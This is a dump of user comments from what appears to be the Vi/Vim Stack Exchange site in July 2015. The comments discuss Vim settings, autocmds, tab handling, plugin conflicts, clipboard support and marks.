  <row Id="5707" PostId="3957" Score="1" Text="@RafaelSoufraz `Pattern not found` is very different from `Missing quote` and `Invalid expression`. It sounds like Karl's answer solved the problem you were asking about. If you expect to find that pattern and are surprised that you don't, then that's a different question–the command seems to execute correctly." CreationDate="2015-07-16T18:20:22.873" UserId="1306" />
  <row Id="5708" PostId="3957" Score="0" Text="Ok.. I'll open another thread. Thanks." CreationDate="2015-07-16T18:41:09.973" UserId="2848" />
  <row Id="5709" PostId="3967" Score="0" Text="Ah, it's even in the help file for global. How silly I am. Thank you" CreationDate="2015-07-17T02:30:49.817" UserId="130" />
  <row Id="5710" PostId="3966" Score="1" Text="On a side note: you can also do it like this: `:%s/$/\r/`, or like this: `:%s/\n/\r\r/`.  The takeaway is that newlines can be matched with `\n`, but have to be written as `\r` in replacement values." CreationDate="2015-07-17T05:07:16.803" UserId="1577" />
  <row Id="5711" PostId="3965" Score="0" Text="Maybe there's an error in the snippet file you created (I don't know if there is, since you didn't post it ;-) )" CreationDate="2015-07-17T07:28:39.377" UserId="51" />
  <row Id="5714" PostId="3971" Score="0" Text="What if I want to run this on all the files that are currently open, i.e. I execute :wa?" CreationDate="2015-07-17T15:30:13.733" UserId="2865" />
  <row Id="5715" PostId="3971" Score="0" Text="If the files were opened with the correct filetype, the `FileType` autocmd in the answer would have already set up the second autocmd (`BufWritePre`) to fire when you save them." CreationDate="2015-07-17T15:41:25.273" UserId="1800" />
  <row Id="5716" PostId="3971" Score="0" Text="I need some clarification. Let's say I have multiple open unsaved buffers, buf1, buf2 and buf3. All of them have trailing spaces. I'm currently working on buf3. If I save buf3  the autocmd will be executed in buf3. Here is my question: Will it be executed on buf1 and on buf2? Based on the documentation from autocmd-buflocal it seems like that it won't" CreationDate="2015-07-17T15:46:42.513" UserId="2865" />
  <row Id="5717" PostId="3971" Score="1" Text="The `FileType` autocmd above will fire for *every* file you open with the correct filetype, and will setup a *buffer-local* event for *each* of those files. So if you run `:wa`, vim will run registered events for each buffer, before saving to file." CreationDate="2015-07-17T15:48:28.120" UserId="1800" />
  <row Id="5718" PostId="3971" Score="0" Text="(... and if you run `:w`, the event will run only for the current buffer)" CreationDate="2015-07-17T15:58:05.787" UserId="1800" />
  <row Id="5719" PostId="3972" Score="0" Text="Why not just do `set tabstop=2 softtabstop=2 shiftwidth=2`?   That will apply for all filetypes when put in your vimrc, unless an ftplugin overrides it." CreationDate="2015-07-17T16:01:47.180" UserId="865" />
  <row Id="5720" PostId="3972" Score="0" Text="Looks like I forgot to add expandtab to the original code. I've just done the edit. That is what my concern. Expand the tabs in every file except when it is make." CreationDate="2015-07-17T16:11:01.143" UserId="2865" />
  <row Id="5721" PostId="3972" Score="0" Text="As @EvergreenTree suggested, just put `set expandtab` in your vimrc and do not put `setlocal expandtab` in your FileType autocommand." CreationDate="2015-07-17T16:36:52.537" UserId="2055" />
  <row Id="5722" PostId="3971" Score="1" Text="So if you open 5 Python files you'll have 5 `autocmd`s instead of a single one, all on write.  Then if, say, 3 of these files get hidden, then get shown again, `FileType` gets re-triggered so you get 3 more `autocmd`s, also on write.  This is brilliant, I wonder why I didn't come up with this solution. :)" CreationDate="2015-07-17T16:59:27.947" UserId="1577" />
  <row Id="5723" PostId="3971" Score="0" Text="@lcd047: Really? If you do all that and notice a performance degradation, let me know." CreationDate="2015-07-17T17:21:01.170" UserId="2055" />
  <row Id="5724" PostId="3971" Score="1" Text="Performance is not a problem.  Running the function `stripTrailingWhiteSpaces()` several times against the same file might have unintended consequences though.  Also, the more `autocmd`s you have for the same event for the same file, the more likely you are to run into some really race conditions.  Try searching vim_dev archives to get an idea.  Then again, what do I know, it might just work for you, right?" CreationDate="2015-07-17T17:34:41.997" UserId="1577" />
  <row Id="5725" PostId="3972" Score="0" Text="@EvergreenTree Can you post an answer so I could accept it and upvote it. Your suggestion worked." CreationDate="2015-07-17T18:11:50.390" UserId="2865" />
  <row Id="5726" PostId="3973" Score="0" Text="What have I done to deserve a downvote?" CreationDate="2015-07-17T18:19:59.253" UserId="2865" />
  <row Id="5727" PostId="3974" Score="0" Text="My tabstop, shiftwidth and softtabstop are all set to 4. &#xA;Clearly my understanding of tabstop is wrong even after reading help for tabstop. Would you mind clarifying your answer. Even after reading help for tabstop, I still don't see what I'm doing wrong." CreationDate="2015-07-17T18:33:43.230" UserId="2865" />
  <row Id="5728" PostId="3971" Score="0" Text="@lcd047 I don't work with very large files, so this works for me." CreationDate="2015-07-17T18:37:55.820" UserId="2865" />
  <row Id="5729" PostId="3976" Score="0" Text="I thought when I set my tabstop to 4 I tell vim to use 4 spaces for a tab. And when I set my listchar character to tab:►-, it will fill the first space with ►, and the other spaces with - . My interpretation seems to be incorrect. Am I correct in understanding that there tab character doesn't occupy the same number of spaces every time? If yes, then how do I know how many spaces it occupies in a given instance?" CreationDate="2015-07-17T20:42:28.353" UserId="2865" />
  <row Id="5730" PostId="3976" Score="0" Text="The tab character never occupies even one space. The string used by Vim to materialize tabulations, on the other hand, is of variable width: `►` followed by as many `-` as necessary (7 with the default `ts`, 3 if you set it to 4...). My answer is likely to be the most comprehensive you will ever get to *this* question. If unsure about the value of `tabstop` for your makefiles do `:echo &amp;tabstop`. If you are not satisfied with your current settings, look around this site or stack overflow for &quot;filetype specific settings&quot;. Or ask another more specific question, **with your actual settings.**" CreationDate="2015-07-17T20:59:39.360" UserId="54" />
  <row Id="5731" PostId="3965" Score="0" Text="Hi @Carpetsmoker , I've posted my snippets." CreationDate="2015-07-18T02:22:11.463" UserId="1276" />
  <row Id="5732" PostId="3978" Score="0" Text="Related: http://stackoverflow.com/q/6952636/2072269 (no answer given that can be used after you have *already* done a resize)." CreationDate="2015-07-18T03:20:31.330" UserId="205" />
  <row Id="5733" PostId="3978" Score="0" Text="@muru: nice, but that's for this specific case. What if I've done something like `fz` and then `10;`? What about `:tabm +1`? Are these all going to have to be special-cased?" CreationDate="2015-07-18T03:23:51.133" UserId="142" />
  <row Id="5734" PostId="3978" Score="0" Text="I think you misunderstood me. I'm saying the linked post has useless answers (before somebody else comes and suggests it)." CreationDate="2015-07-18T03:25:06.457" UserId="205" />
  <row Id="5735" PostId="3978" Score="0" Text="oh! okay, then we're on the same page @muru :)" CreationDate="2015-07-18T03:36:42.600" UserId="142" />
  <row Id="5736" PostId="3971" Score="0" Text="(perhaps using `augroup` with an initial `autocmd!` would solve all problems)" CreationDate="2015-07-18T15:04:09.943" UserId="1800" />
  <row Id="5737" PostId="3980" Score="1" Text="I'm sorry, but I can't help with Vim-LaTeX. However, I do develop my own LaTeX-plugin: [vimtex](https://github.com/lervag/vimtex), which I personally think is getting pretty good. There is also several other good ones (IMHO), e.g. [LaTeX-Box](https://github.com/LaTeX-Box-Team/LaTeX-Box), [atp](http://atp-vim.sourceforge.net/) and [vim-latex-live-preview](https://github.com/xuhdev/vim-latex-live-preview)." CreationDate="2015-07-18T16:23:21.163" UserId="21" />
  <row Id="5738" PostId="3971" Score="0" Text="@VanLaser: That's a good idea. I'll try that and post and update. lcd047's answer had a good approach, too. It's a shame he deleted it. I was just trying for an answer that was a simple, direct solution to the original problem. It's expensive to give answers that aren't perfect." CreationDate="2015-07-18T16:42:05.800" UserId="2055" />
  <row Id="5739" PostId="3971" Score="0" Text="It's the 'point based system' - people giving answers should be encouraged to collaborate between them, not compete. And perfect answers (which are then simply copy-pasted in a `vimrc`) don't help so much as a short *incomplete* answer which makes the user sweat a little (which is the real help)." CreationDate="2015-07-18T16:54:35.393" UserId="1800" />
  <row Id="5740" PostId="3980" Score="0" Text="Perhaps ask on [tex.se], you might find somebody there that has it at hand." CreationDate="2015-07-18T17:39:52.237" UserId="1577" />
  <row Id="5741" PostId="3980" Score="0" Text="There is some information in the help (`:help recommended-settings`) and a lot in the &quot;texrc&quot; file included with the plugin (`vim-latex/ftplugin/latex-suite/texrc`). Are you looking for something beyond these?" CreationDate="2015-07-18T17:50:33.483" UserId="1306" />
  <row Id="5742" PostId="3983" Score="1" Text="@Emre That's the `recommended-settings` section from the help, which you should have if you have installed the plugin. Is it what you are looking for?" CreationDate="2015-07-18T18:17:43.597" UserId="1306" />
  <row Id="5743" PostId="3986" Score="0" Text="Awesome! I just figured it out too. The getting command line options is something I hadn't figured out too.&#xA;&#xA;I ended up having to remap a single string command to the &quot;wincmd J&quot; as well." CreationDate="2015-07-19T03:20:24.857" UserId="2888" />
  <row Id="5744" PostId="3983" Score="1" Text="Yes that's it! I misinterpreted the paragraph preceding it to mean that there was more on the vimrc file on Sourceforge. Thanks a lot, both the answer and the comment have been illuminating." CreationDate="2015-07-19T04:52:03.947" UserId="2882" />
  <row Id="5745" PostId="3986" Score="1" Text="Looking at `/proc` is specific to Linux, some systems don't even have a `/proc`.  A more portable way to find out what `git mergetool` does is to use a wrapper script that writes its arguments to a file and `exec`s Vim, and point `mergetool` to the script." CreationDate="2015-07-19T12:58:35.453" UserId="1577" />
  <row Id="5746" PostId="3988" Score="0" Text="Nice (+1). - Have you an idea why the macros don't work if in line 1 of the data file?" CreationDate="2015-07-19T12:58:43.477" UserId="2479" />
  <row Id="5747" PostId="3988" Score="0" Text="@Janis Apparently the `&lt;C-u&gt;` didn't work the way I imagined it.  Without it the macros work from everywhere (well, hopefully), but they no longer take a count.  I'm not sure I understand why though." CreationDate="2015-07-19T13:13:51.363" UserId="1577" />
  <row Id="5748" PostId="3986" Score="0" Text="@lcd047 nice idea. Updated." CreationDate="2015-07-19T13:21:55.893" UserId="205" />
  <row Id="5751" PostId="3988" Score="0" Text="@Janis I found a version that accepts counters, but it seems unnecessarily complicated. _shrug_" CreationDate="2015-07-19T14:04:28.777" UserId="1577" />
  <row Id="5752" PostId="3992" Score="3" Text="I've been happy with Ingo Karkat's SpellCheck.vim plugin, available at https://github.com/vim-scripts/SpellCheck and normally at http://www.vim.org/scripts/script.php?script_id=3844, except that vim.org is down at the moment." CreationDate="2015-07-20T05:34:51.793" UserId="2055" />
  <row Id="5754" PostId="3965" Score="1" Text="garbas FAQ: [SnipMate doesn't work / My snippets aren't triggering](https://github.com/garbas/vim-snipmate#faq)" CreationDate="2015-07-20T07:09:46.610" UserId="1145" />
  <row Id="5756" PostId="3993" Score="0" Text="It would be one thing if you were writing the content yourself, but modifying copy-pasted content on the fly... No, I'd suggest you use code-formatting." CreationDate="2015-07-20T07:13:51.520" UserId="205" />
  <row Id="5757" PostId="3998" Score="6" Text="Here we go again: don't use assignments to save and restore registers, you'll lose all information about the registers' types.  Use `getreg()`, `getregtype()`, and `setreg()` instead." CreationDate="2015-07-20T07:47:35.833" UserId="1577" />
  <row Id="5758" PostId="3994" Score="1" Text="Hmm, I think you meant ` \n` and not `\n `. In Markdown, contiguous lines form a paragraph and get wrapped, unless a) they are in a code block, list or other such special environment or b) a line ends with two spaces `foo__$`. Though it doesn't have to be as complicated as you make it out: `:s/$/  /` should be enough. The problem is doing it to pasted content automatically." CreationDate="2015-07-20T07:49:11.117" UserId="205" />
  <row Id="5759" PostId="3995" Score="0" Text="I'm curious about the downvotes, can you please explain?  Thanks in advance!" CreationDate="2015-07-20T10:00:59.663" UserId="1577" />
  <row Id="5760" PostId="3993" Score="2" Text="The fact that newlines are ignored is also considered a *feature*, since it allows you to wrap your source document to 78 characters, and still format it differently. Learn to love it :-)" CreationDate="2015-07-20T10:04:08.597" UserId="51" />
  <row Id="5764" PostId="3999" Score="0" Text="Indeed, I find it *very* strange you associating the issue with jedi when not using that plugin doesn't make any difference. O.o" CreationDate="2015-07-20T11:02:26.037" UserId="205" />
  <row Id="5765" PostId="3999" Score="0" Text="@muru --- I have no problem if I comment out the `Plug 'davidhalter/jedi-vim` line in `-vimrc` --- maybe I explained myself badly. Sorry..." CreationDate="2015-07-20T11:20:32.230" UserId="854" />
  <row Id="5766" PostId="3999" Score="1" Text="Oh, I suppose then I misread: *I checked that commenting out the plugin will remove the problem. Even adding let g:jedi#auto_initialization = 0 will not solve the problem...* It seemed like the last clause applied to both sentences." CreationDate="2015-07-20T11:21:24.503" UserId="205" />
  <row Id="5767" PostId="4001" Score="0" Text="Ok, that fixed. But I am sure it show on when `jedi-vim` is enabled; it probably set the `conceallevel` to something different from 0 at startuo. Thanks!" CreationDate="2015-07-20T11:27:17.393" UserId="854" />
  <row Id="5768" PostId="4001" Score="0" Text="@Rmano Now that you mention it, yes, `jedi-vim` does set `conceallevel`, but only locally, for `python` buffers.  It should have nothing to do with `latex` buffers." CreationDate="2015-07-20T11:56:53.427" UserId="1577" />
  <row Id="5769" PostId="4001" Score="0" Text="Yep, I see --- it's in `.../plugged/jedi-vim/after/python.vim`. I do not know why it is triggered for the latex files. Puzzled." CreationDate="2015-07-20T12:40:59.150" UserId="854" />
  <row Id="5770" PostId="4001" Score="1" Text="@Rmano It's a lot more likely that a `latex`-related plugin sets `conceallevel` than `jedi-vim`.  To find out where `conceallevel` has been set, open a `latex` file and run `:verbose set conceallevel?`." CreationDate="2015-07-20T12:45:27.820" UserId="1577" />
  <row Id="5771" PostId="4001" Score="0" Text="I updated the question --- that file is actually read when I open a `.tex` buffer. Maybe some kind of sub-syntax editing for listing environment? No idea. Thanks anyway!" CreationDate="2015-07-20T12:56:47.160" UserId="854" />
  <row Id="5772" PostId="4001" Score="0" Text="To find out where the problem __was__ you need to remove the `autocmd` so that the problem comes up again, __then__ open a `latex` file and run the `:verbose` thing again.  On a side note: use a `ftplugin` instead of an `autocmd`.  If you people knew how truly bad these things really are under the hood, you'd avoid them like the pest." CreationDate="2015-07-20T13:00:05.353" UserId="1577" />
  <row Id="5773" PostId="4001" Score="0" Text="Yes, this is what I did. I think that the problem is that `vimtex` loads syntax highlighting for nested &quot;listing&quot; environment, see [here](https://github.com/lervag/vimtex/blob/master/after/syntax/tex.vim) from line 66 onward." CreationDate="2015-07-20T13:02:38.030" UserId="854" />
  <row Id="5774" PostId="4001" Score="0" Text="@Rmano So, where does `verbose` says `conceallevel` comes from?" CreationDate="2015-07-20T13:03:38.293" UserId="1577" />
  <row Id="5775" PostId="4001" Score="0" Text="@lcd047 it comes from jedi-vim's `after/syntax/python.vim` (which gets &quot;forcefully&quot; loaded for `.tex` buffers by the plugin.  I wonder if moving the `set conceallevel` out of the syntax file makes sense?  At least it would fix this issue probably.  Does it better fit into the `ftplugin`?" CreationDate="2015-07-20T13:13:43.880" UserId="2899" />
  <row Id="5776" PostId="4001" Score="1" Text="@Rmano Now this is something you could ask the `jedi-vim` guys: why does `after/syntax/python.vim` get run for `latex` files?" CreationDate="2015-07-20T13:17:50.317" UserId="1577" />
  <row Id="5777" PostId="4001" Score="0" Text="@lcd047 --- yep. Continuing in https://github.com/davidhalter/jedi-vim/issues/440" CreationDate="2015-07-20T13:51:50.980" UserId="854" />
  <row Id="5778" PostId="3944" Score="0" Text="*&quot;I know, vim -u NONE, remove plugins one by one... Just thought maybe somebody knows what's causing it.&quot;* -&gt; So did this fix it?" CreationDate="2015-07-20T14:37:54.890" UserId="51" />
  <row Id="5779" PostId="3944" Score="0" Text="Haven't tried yet." CreationDate="2015-07-20T14:39:37.957" UserId="237" />
  <row Id="5780" PostId="3907" Score="0" Text="The `&lt;Esc&gt;` or `&lt;C-]&gt;` sequence is called during startup, for sending information to the terminal. Remapping `&lt;C-[&gt;` is something that should be an error when running in a terminal, IMHO." CreationDate="2015-07-20T14:45:35.593" UserId="51" />
  <row Id="5781" PostId="3984" Score="1" Text="This is great, and an excellent example of well-written VimScript! Some minor (perhaps picky) feedback: This repeat command would behave different from the way the built-in `.` behaves with a count. When a count is supplied to `.`, the previous count is ignored. So `2dd` followed by `3.` would delete 2 lines and then 3 lines; in contrast, with your mappings, `2&lt;C-w&gt;-` followed by `3Q` would shrink the window by 2 lines and then by 6 (= 2x3) lines. That behaviour is fine, but it's nice to draw from analogous built-in Vim commands when choosing how a custom command should behave." CreationDate="2015-07-20T14:52:54.227" UserId="64" />
  <row Id="5782" PostId="3984" Score="0" Text="Thanks!  Also, I see what you mean with how the count works.  I may change it so it works that way." CreationDate="2015-07-20T15:17:05.410" UserId="865" />
  <row Id="5783" PostId="4003" Score="0" Text="The first section did the trick for me: fortunately my use case was the 'markdown' and 'mail file types. Thank you for the very detailed answer." CreationDate="2015-07-20T16:10:58.430" UserId="2894" />
  <row Id="5784" PostId="3995" Score="0" Text="I didn't issue any downvotes, but my concern with this approach is its potential to litter my good-list with nonsense words from chunks of URLs." CreationDate="2015-07-20T16:11:42.087" UserId="2894" />
  <row Id="5785" PostId="3995" Score="0" Text="@noffle The idea was to save all that garbage in a separate (throw-away) custom dictionary.  But the answer posted by Carpetsmoker makes more sense anyway." CreationDate="2015-07-20T16:37:43.900" UserId="1577" />
  <row Id="5786" PostId="3971" Score="0" Text="@VanLaser _It's the 'point based system'_ - Then my method of gaming the system is pretty inefficient, since I actually lost the upvote points by deleting my answer.  Not to mention that there are strategies that seem to work better for some [people](http://stackexchange.com/users/52354/tim?tab=accounts) than actually answering questions. :)" CreationDate="2015-07-20T17:17:20.870" UserId="1577" />
  <row Id="5787" PostId="3971" Score="0" Text="Then you care about your answer being checked. But one thing is sure, it wasn't the fault of 'garyjohn', so your attack was misplaced. Also: this answer, while originally incomplete, was actually very well thought, because it tried to stay true to the OP intention - something as close as possible to doing an AND between the two `autocmd`s. In any case, this shows the nature of this site: the  guy who asks and those who visit the site check and give points, and the more knowledgeable guys compete between themselves, in something that the original OP doesn't care or sometimes even understands." CreationDate="2015-07-20T18:08:43.097" UserId="1800" />
  <row Id="5788" PostId="3971" Score="0" Text="@VanLaser I'm not sure I understand your point.  Actually, I'm pretty sure I don't.  I deleted my answer simply because the OP has stated that he's happy with the answer he accepted.  That's the official recommendation when there are several good answers, and at least one is strictly better than yours, right? The original answer was IMO less than great and I criticised it (I would have done that even if I haven't posted another answer), but I admitted that it's better than mine when the OP said so.  Where exactly is the &quot;attack&quot;, the &quot;fault&quot;, the &quot;competition&quot;, and whatever else you saw above?" CreationDate="2015-07-20T18:28:29.767" UserId="1577" />
  <row Id="5789" PostId="3971" Score="0" Text="I don't see why one would delete a good answer. Variety is good - you may give ideas to ALL the others who later visit the thread and have the same question. And yes, I meant your original critique, and all this thread in general :P" CreationDate="2015-07-20T18:31:16.207" UserId="1800" />
  <row Id="5790" PostId="3971" Score="0" Text="@VanLaser Because according to the OP my answer wasn't good enough.  Regardless of what I thought about it. _shrug_" CreationDate="2015-07-20T18:32:57.560" UserId="1577" />
  <row Id="5791" PostId="3971" Score="0" Text="@lcd047 - you care too much then ;)" CreationDate="2015-07-20T18:35:30.847" UserId="1800" />
  <row Id="5792" PostId="3976" Score="1" Text="@flashburn: This isn't specific to vim; it's how tab character behave in general. Printing a tab character advances to the next tab stop, however many columns that happens to be. The behavior goes back (at least) to manual typewriters." CreationDate="2015-07-20T21:52:05.343" UserId="2380" />
  <row Id="5793" PostId="4004" Score="0" Text="True, but this still leaves a blank line." CreationDate="2015-07-21T07:08:19.493" UserId="205" />
  <row Id="5794" PostId="2285" Score="0" Text="`:nohl` seems redundant to me - there are no trailing spaces which will be highlighted. Perhaps the previous values of `hl` should be restored? Not just set off." CreationDate="2015-07-21T12:42:47.640" UserId="182" />
  <row Id="5795" PostId="4006" Score="0" Text="Perhaps add a space after `0read`?  Also wrap `g:filePath` in a `fnameescape()`?" CreationDate="2015-07-21T17:04:10.013" UserId="2313" />
  <row Id="5796" PostId="4010" Score="2" Text="Has your vim been compiled with the option `+clipboard`? You can check that with the function `:version()`. More precisely you can use `:echo has('clipboard')` to check if this precise option is enabled. If it is not you'll have to recompile a vim with this option." CreationDate="2015-07-22T05:03:21.710" UserId="1841" />
  <row Id="5797" PostId="4011" Score="1" Text="`@-@`? Is  that Bram's way of showing he's mad at use for making `@` part of words?" CreationDate="2015-07-22T05:59:09.190" UserId="205" />
  <row Id="5798" PostId="4012" Score="0" Text="Thanks, @Carpetsmoker! I didn't have the time to expand my answer until now." CreationDate="2015-07-22T14:04:22.827" UserId="21" />
  <row Id="5799" PostId="4011" Score="0" Text="Note that there are side effects to changing `iskeyword`. For example, if you add `@` to `iskeyword`, the standard word motion command (`w`) will also move across e.g. `@word @otherword`." CreationDate="2015-07-22T14:13:19.947" UserId="21" />
  <row Id="5800" PostId="4010" Score="1" Text="That's probably the problem, but you don't have to recompile to solve it. If gvim is installed, you can start it as `gvim -v` and get a terminal vim, or you can link gvim to vim, e.g., `ln /usr/bin/gvim ~/bin/vim` and make sure `~/bin` is before `/usr/bin` in your PATH." CreationDate="2015-07-22T16:07:40.130" UserId="2055" />
  <row Id="5801" PostId="4010" Score="0" Text="@garyjohn I don't understand how using a terminal vim instead of the gui version will enable the `clipboard` option?" CreationDate="2015-07-22T18:07:26.197" UserId="1841" />
  <row Id="5802" PostId="4010" Score="1" Text="@statox: The OP didn't say whether he was using vim or gvim, but this is a commonly-encountered problem with terminal vim on Ubuntu and Fedora systems, so I assumed the OP was using terminal vim. The problem is that these distributions build their vim packages without support for X, which I don't understand. They also have separate vim and gvim packages, which I don't understand, either. Gvim, of course, has support for X. Both vim and gvim binaries can be run in either terminal mode or GUI mode, depending on how they're invoked. ..." CreationDate="2015-07-22T18:35:35.250" UserId="2055" />
  <row Id="5803" PostId="4010" Score="1" Text="... My proposal was for the OP to run the gvim binary, which does support X and the clipboard, in terminal mode so that the clipboard will be available." CreationDate="2015-07-22T18:37:51.877" UserId="2055" />
  <row Id="5804" PostId="4010" Score="0" Text="@garyjohn Ok I understand better your suggestion now. I don't know if it's a really clean solution but that's a clever workaround :-)" CreationDate="2015-07-22T18:44:58.627" UserId="1841" />
  <row Id="5806" PostId="4010" Score="1" Text="@statox my vim doesn't have a `version()` function, but it does have a `:version` command. Is that a typo or is my `:version` missing `version()`?" CreationDate="2015-07-22T19:24:57.007" UserId="1306" />
  <row Id="5807" PostId="4010" Score="0" Text="@jjaderberg You are totally right vim doesn't have a `version()` function only a `:version` command. That was a typo, my bad. (Unfortunately I can't edit my comment anymore)" CreationDate="2015-07-22T19:28:09.873" UserId="1841" />
  <row Id="5808" PostId="4010" Score="0" Text="@statox It's rarely safe to say &quot;vim doesn't have...&quot;, but I figured it was probably a mistype, thanks for clarifying. It looks like the question will be merged anyway (hmm..) so the comments will be dropped, otherwise your comment would serve well as a partial answer–&quot;here's the first step to troubleshoot your issue...&quot;." CreationDate="2015-07-22T19:36:46.613" UserId="1306" />
  <row Id="5809" PostId="4017" Score="0" Text="Can you expand on your `gf` section (i'll get to others later). I'm typing `gf` over &quot;avatar&quot; and…nothing. Can you tell he how to check if my &quot;defaults&quot; are configured as you mention?" CreationDate="2015-07-22T20:52:23.303" UserId="2918" />
  <row Id="5810" PostId="4017" Score="0" Text="FWIW: `:setlocal includeexpr` -&gt; `includeexpr=rails#includeexpr(v:fname)`" CreationDate="2015-07-22T20:56:16.267" UserId="2918" />
  <row Id="5811" PostId="4017" Score="0" Text="That `includeexpr` is wrong, rails.vim has no business defining that for non-ruby/rails files and I suspect `suffixesadd` is wrong too. Also, see my edit." CreationDate="2015-07-22T21:07:15.907" UserId="54" />
  <row Id="5812" PostId="4010" Score="0" Text="@jjaderberg: Are you trying to get me to unmerge this question?" CreationDate="2015-07-22T21:49:35.150" UserId="2062" />
  <row Id="5813" PostId="4017" Score="0" Text="FYI: while editing a .scss file `:set suffixesadd` -&gt; `suffixesadd=.sass,.scss,.css`" CreationDate="2015-07-23T00:59:29.210" UserId="2918" />
  <row Id="5814" PostId="4021" Score="0" Text="Had to change the command a bit, otherwise it only seemed to affect the first file in the `args` list: `:argdo %s/^Z//ge | update`. Got the idea for that from the `:help argdo`. Thanks for the help nevertheless, wasn't familiar with this command until now! :)" CreationDate="2015-07-23T06:22:29.163" UserId="1045" />
  <row Id="5815" PostId="4021" Score="2" Text="It could also just be a matter of &quot;style&quot; to add them; perhaps they displayed different in the editor that the program was written in." CreationDate="2015-07-23T08:07:35.247" UserId="51" />
  <row Id="5816" PostId="4022" Score="0" Text="Pressing `^C` will abort whatever Vim is doing, such as applying colours. You probably just need to be more patient..." CreationDate="2015-07-23T09:49:05.487" UserId="51" />
  <row Id="5817" PostId="4018" Score="1" Text="+1 for a nicer way to comment blocks than ma + motion + :'a,.s/^/\/\// :)" CreationDate="2015-07-23T09:50:31.170" UserId="1430" />
  <row Id="5818" PostId="4022" Score="0" Text="@Carpetsmoker I would like to apply them now to the content what is there. The point is not to wait since I could put there too 2TB file." CreationDate="2015-07-23T09:58:02.530" UserId="2923" />
  <row Id="5819" PostId="4022" Score="1" Text="@Masi try running `:diffupdate`" CreationDate="2015-07-23T10:10:32.963" UserId="205" />
  <row Id="5820" PostId="4022" Score="1" Text="The &quot;content that is there&quot; is 2TB of data. Vim always reads the entire file into memory, so editing a 2TB file will not work in Vim unless you have a lot of swap space. Vim also doesn't diff by itself, it uses the extenal `diff` tool and parses the output of that. If you want to have it behave different, you'll have to write your own diffexpr function ([`:help diff-diffexpr`](http://vimhelp.appspot.com/diff.txt.html#diff%2ddiffexpr))..." CreationDate="2015-07-23T10:14:11.393" UserId="51" />
  <row Id="5821" PostId="4022" Score="0" Text="@Carpetsmoker My need is max 2 Gb now." CreationDate="2015-07-23T10:15:00.847" UserId="2923" />
  <row Id="5822" PostId="4022" Score="0" Text="@muru `:diffupdate` does not respond." CreationDate="2015-07-23T10:15:25.793" UserId="2923" />
  <row Id="5823" PostId="4023" Score="1" Text="Are you running Vim inside a terminal emulator? If so, then mapping `&lt;C-c&gt;` probably doesn't work." CreationDate="2015-07-23T10:50:46.950" UserId="51" />
  <row Id="5824" PostId="4023" Score="0" Text="I don't know the difference between a terminal and a terminal emulator, but I'm running it in iTerm2." CreationDate="2015-07-23T10:52:20.563" UserId="69" />
  <row Id="5826" PostId="4020" Score="2" Text="Note that `:set fo-=ro` won't work if you use `:set fo=or` (different order), you need to use `:set fo-=r fo-=o`." CreationDate="2015-07-23T12:33:53.713" UserId="51" />
  <row Id="5828" PostId="3992" Score="4" Text="You could add the words you want to skip to the `internal-wordlist`, with `zG`. Since the list is lost when you exit Vim, it's similar to 'skip', and Vim won't ask you again to correct the same word, in the same session. Another way would be to teach Vim to only spell-check by syntax, i.e. in *certain* regions, and ignore the others." CreationDate="2015-07-23T16:18:10.723" UserId="1800" />
  <row Id="5829" PostId="4026" Score="0" Text="Changes to the file are incremental, not independent. I think the best you can do is look at the diff with Gundo and sort of manually apply that portion of the change state." CreationDate="2015-07-24T03:39:49.540" UserId="64" />
  <row Id="5831" PostId="3457" Score="0" Text="With this, after opening a `readonly` file and then creating a new buffer the new buffer ends up `nomodifiable`." CreationDate="2015-07-24T05:13:45.550" UserId="268" />
  <row Id="5832" PostId="3457" Score="0" Text="Thanks for pointing that out, I hadn't noticed. I'm not sure how to test for a new buffer." CreationDate="2015-07-24T07:22:04.437" UserId="2283" />
  <row Id="5833" PostId="4027" Score="0" Text="possible duplicate of [GitHub for .vimrc and plugins](http://vi.stackexchange.com/questions/543/github-for-vimrc-and-plugins)" CreationDate="2015-07-24T07:35:39.793" UserId="163" />
  <row Id="5834" PostId="4027" Score="0" Text="Perhaps you want to use forward slashes? i.e. `set VIM=x:/path/to/repo`. I don't have a Windows machine to test, but all the docs use forwards slashes." CreationDate="2015-07-24T09:08:02.727" UserId="51" />
  <row Id="5837" PostId="4031" Score="1" Text="Also you could look at this post for further informations : http://superuser.com/questions/687441/how-to-undo-accidental-mark-overwrite-instead-of-jumping-in-vim" CreationDate="2015-07-24T09:43:15.827" UserId="1821" />
  <row Id="5838" PostId="4031" Score="0" Text="@Nobe4 thanks for your link I hadn't found it but it seems to confirm that it isn't really possible to do that easily." CreationDate="2015-07-24T09:50:59.550" UserId="1841" />
  <row Id="5839" PostId="4031" Score="0" Text="Use the jump commands (`ctrl-o`, `ctrl-i` and `:jumps`) with your own personal memory :)" CreationDate="2015-07-24T11:45:02.427" UserId="1800" />
  <row Id="5840" PostId="4032" Score="0" Text="Wow as usual amazing answer! I'll try take time this weekend to implement the exercice for the reader ;)" CreationDate="2015-07-24T11:53:25.940" UserId="1841" />
  <row Id="5841" PostId="4034" Score="0" Text="I'm not a great fan of the visible mark on the margin but it seems to have some interesting features I'll take a look at it." CreationDate="2015-07-24T11:55:33.187" UserId="1841" />
  <row Id="5842" PostId="4033" Score="0" Text="I can't really say that the problem is this type of navigation because I use those marks really occasionnaly and most of the time I navigate differently through my files. Nevertheless I've been thinking for a long time that I should use the jump list more often so that seems like a nice way to do it!" CreationDate="2015-07-24T12:00:54.937" UserId="1841" />
  <row Id="5843" PostId="4034" Score="0" Text="@statox In the same vein, there's also [showmarks](https://github.com/zakj/vim-showmarks).  It shows literally _all_ marks (the plugin above only deals with alphabetic ones), and can be toggled with a key.  I find it useful occasionally." CreationDate="2015-07-24T12:09:11.383" UserId="2313" />
  <row Id="5844" PostId="4034" Score="0" Text="Yes I've been using showmarks for a few time (unlike signature) that's why I said I'm not a fan of marks in the margin but I'm trying signature right now to see if I like it :-)" CreationDate="2015-07-24T12:14:17.697" UserId="1841" />
  <row Id="5845" PostId="4033" Score="0" Text="Even if they can be saved between vim sessions, it's too easy to overwrite marks. I added an alternative solution." CreationDate="2015-07-24T12:46:33.727" UserId="1800" />
  <row Id="5846" PostId="4033" Score="0" Text="Indeed your alternative solution seems to be worth a try thanks a lot!" CreationDate="2015-07-24T13:05:38.567" UserId="1841" />
  <row Id="5847" PostId="4027" Score="0" Text="Don't manually set the `VIM` environment variable.  `$VIM` and `$VIMRUNTIME` are automatically set by Vim when it runs.  You should prefer to use `$HOME` since that is your personal config area where as `$VIM` is a system directory, which you may not even have write access to." CreationDate="2015-07-24T14:20:56.020" UserId="15" />
